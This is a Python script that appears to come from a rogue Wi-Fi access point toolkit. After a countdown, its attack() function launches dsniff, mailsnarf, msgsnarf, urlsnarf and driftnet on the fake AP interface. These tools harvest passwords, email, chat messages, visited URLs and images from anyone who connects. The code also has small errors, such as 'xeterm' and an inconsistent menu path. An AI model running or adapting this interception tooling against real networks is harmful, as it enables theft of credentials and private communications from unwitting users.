def attack(): # Launch Attack!!!
  os.system("clear")
  print("Everything is done, FakeAP is prepeared!")
  proceed = input("\nAttack?(y/n) -->")
  if proceed == "y":
    os.system("clear")
    print("Launching Dnsniff suite...")
    time.sleep(0.7)
    os.system("clear")
    print("\n\n\n\t\t\t\t3")
    time.sleep(1)
    os.system("clear")
    print("\n\n\n\t\t\t\t2")
    time.sleep(1)
    os.system("clear")
    print("\n\n\n\t\t\t\t1")
    time.sleep(1)
    os.system("clear")
    print("Launched!")
    os.system("xterm -e 'dsniff -i at0' &") # Launch dnsiff!
    os.system("xterm -e 'mailsnarf -i at0' &") # Launch mailsnarf!
    os.system("xterm -e 'msgsnarf -i at0' &") # Launch msgsnarf!
    os.system("xterm -e 'urlsnarf -i at0' &") # Launch URLsnarf!
    os.system("xeterm -e 'driftnet -i at0' &") # Launch Driftnet!
    os.system("clear")
    print("Do you want to launch another attack?")
    time.sleep(1.5)
    os.system("clear")
    os.system("python creator/attacks/main.py")
  elif proceed == "n":
    os.system("clear")
    print("Aborted!")
    time.sleep(1)
    os.system("clear")
    print("Back to menu...")
    time.sleep(1)
    os.system("clear")
    os.system("python /creator/attacks/main.py")
  else:
    os.system("clear")
    print("Yes(y) or No(n).")
    time.sleep(1)
    os.system("clear")
    attack()

def noroot(): # noRoot
  os.system("clear")
  print("RUN AS ROOT!")
  time.sleep(2)
  exit()

# Root verification
root = os.geteuid()
if root == 0:
  attack()
else:
  noroot()
